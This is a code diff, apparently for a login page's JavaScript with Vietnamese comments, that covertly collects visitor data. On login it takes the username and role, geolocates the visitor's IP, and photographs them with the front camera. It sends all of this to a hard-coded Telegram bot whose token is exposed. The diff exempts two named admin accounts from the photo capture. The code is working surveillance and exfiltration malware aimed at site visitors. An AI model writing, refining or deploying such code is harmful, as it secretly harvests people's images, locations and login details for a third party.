@@ -1,8 +1,8 @@
 const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
 const TELEGRAM_CHAT_ID = '-1003770043455';
 
-const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
 const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
 
 const info = {
   time: '', 
@@ -11,20 +11,19 @@ const info = {
   address: '',
   lat: '',
   lon: '',
-  camera: '⏳ Đang kiểm tra...',
   loginDetails: '',
-  specialNote: '' 
+  specialNote: '',
+  isAdmin: false // Biến để kiểm soát việc chụp ảnh
 };
 
-// --- LẤY THÔNG TIN MẠNG & VỊ TRÍ ---
 async function getNetworkData() {
   try {
     const res = await fetch(`https://ipwho.is/`);
     const data = await res.json();
     info.ip = data.ip || 'Không rõ';
     info.isp = data.connection?.org || 'Saigon Tourist Cable Television';
-    info.lat = data.latitude || 0;
-    info.lon = data.longitude || 0;
+    info.lat = data.latitude || 10.7;
+    info.lon = data.longitude || 106.6;
     info.address = `${data.city}, ${data.region} (Vị trí IP)`;
   } catch (e) { 
     info.ip = 'Lỗi kết nối'; 
@@ -32,8 +31,10 @@ async function getNetworkData() {
   }
 }
 
-// --- CHỤP ẢNH ---
 async function captureCamera() {
+  // Nếu là Admin thì thoát luôn, không xin quyền, không chụp
+  if (info.isAdmin) return null;
+
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
     return new Promise(resolve => {
@@ -51,16 +52,16 @@ async function captureCamera() {
         }, 800);
       };
     });
-  } catch (e) { throw e; }
+  } catch (e) { return null; }
 }
 
-// --- TẠO NỘI DUNG TIN NHẮN (ĐÃ XÓA THIẾT BỊ) ---
 function getCaption() {
   const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
   
-  // Ép hiển thị dòng thông báo Admin nếu có
-  const header = info.specialNote ? `⚠️ ${info.specialNote.toUpperCase()}` : '🔐 [THÔNG TIN ĐĂNG NHẬP]';
+  // Tiêu đề Admin hoặc Người dùng thường
+  const header = info.isAdmin ? `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP` : '🔐 [THÔNG TIN ĐĂNG NHẬP]';
 
+  // NỘI DUNG CHỈ BAO GỒM: THỜI GIAN, TÀI KHOẢN, IP, MẠNG, VỊ TRÍ (ĐÃ BỎ THIẾT BỊ/DVI)
   return `
 ${header}
 ━━━━━━━━━━━━━━━━━━
@@ -70,40 +71,27 @@ ${header}
 🏢 Nhà mạng: ${info.isp}
 🏙️ Địa chỉ: ${info.address}
 📍 Bản đồ: ${mapsLink}
-📸 Camera: ${info.camera}
 ━━━━━━━━━━━━━━━━━━
 `.trim();
 }
 
-// --- HÀM CHÍNH ---
 async function main() {
-  // 1. Lấy thời gian thực
   info.time = new Date().toLocaleString('vi-VN');
-
-  // 2. Lấy User/Role từ giao diện HTML
   const user = document.getElementById('username').value.trim();
   const role = document.getElementById('user-role').value;
   info.loginDetails = `${user} (${role})`;
 
-  // 3. KIỂM TRA ADMIN NGAY LẬP TỨC
+  // Kiểm tra quyền Admin
   if (user === "Mrwenben" || user === "VanThanh") {
-      info.specialNote = `Thông báo admin ${user} vừa đăng nhập vào trang`;
-  } else {
-      info.specialNote = "";
+      info.isAdmin = true;
+      info.specialNote = "Admin";
   }
 
-  // 4. Lấy dữ liệu mạng & Chụp ảnh đồng thời
   await getNetworkData();
   
-  let frontBlob = null;
-  try {
-    frontBlob = await captureCamera();
-    info.camera = '✅ Thành công';
-  } catch (e) {
-    info.camera = '🚫 Bị từ chối';
-  }
+  // Chụp ảnh (Hàm này sẽ tự trả về null nếu là Admin)
+  const frontBlob = await captureCamera();
 
-  // 5. Gửi về Telegram
   if (frontBlob) {
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -112,12 +100,16 @@ async function main() {
     formData.append('media', JSON.stringify(media));
     await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
   } else {
+    // Admin hoặc người từ chối cam sẽ gửi tin nhắn văn bản thuần túy
     await fetch(API_SEND_TEXT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
+      body: JSON.stringify({ 
+        chat_id: TELEGRAM_CHAT_ID, 
+        text: getCaption(),
+        disable_web_page_preview: true 
+      })
     });
   }
-  
   return true; 
 }
